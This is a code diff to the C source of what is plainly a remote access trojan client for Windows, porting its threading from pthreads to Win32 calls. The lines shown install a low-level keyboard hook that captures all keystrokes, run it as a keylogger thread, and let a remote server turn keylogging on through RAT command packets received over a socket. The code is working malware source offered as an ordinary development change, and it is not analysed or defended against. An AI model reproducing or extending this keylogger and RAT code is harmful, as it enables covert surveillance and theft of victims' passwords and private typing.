@@ -2,7 +2,6 @@
 #include "log.h"
 #include "net_util.h"
 
-#include <pthread.h>
 #include <stdint.h>
 #include <stdio.h>
 #include <stdlib.h>
@@ -67,7 +66,7 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
   return CallNextHookEx(hook, nCode, wParam, lParam);
 }
 
-void *keylog_handler(void *vargp) {
+DWORD WINAPI keylog_handler(LPVOID lpParameter) {
   LOG_DEBUG("enter");
   hook = SetWindowsHookExA(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
   MSG msg;
@@ -77,7 +76,7 @@ void *keylog_handler(void *vargp) {
   }
   UnhookWindowsHookEx(hook);
   LOG_DEBUG("leave");
-  return NULL;
+  return 0;
 }
 
 int main() {
@@ -96,8 +95,7 @@ int main() {
   uint8_t *data;
   char buf[DEFAULT_BUFLEN];
   ratpacket_t *p = (ratpacket_t *)buf;
-  pthread_t keylog_thread;
-  pthread_create(&keylog_thread, NULL, keylog_handler, NULL);
+  HANDLE keylog_thread = create_thread(keylog_handler, NULL);
   while (1) {
     int sentbytes = recv(server, buf, sizeof(ratpacket_t), 0);
     if (sentbytes == 0) {
@@ -116,7 +114,7 @@ int main() {
     case RAT_PACKET_TURN_ON:
       if (!keylog_on) {
         keylog_on = 1;
-        pthread_create(&keylog_thread, NULL, keylog_handler, NULL);
+        keylog_thread = create_thread(keylog_handler, NULL);
       }
       break;
     case RAT_PACKET_ECHO:
@@ -189,7 +187,7 @@ exit:
   }
   closesocket(server);
   server = INVALID_SOCKET;
-  pthread_join(keylog_thread, NULL);
+  WaitForSingleObject(keylog_thread, INFINITE);
   WSACleanup();
   return 0;
 }
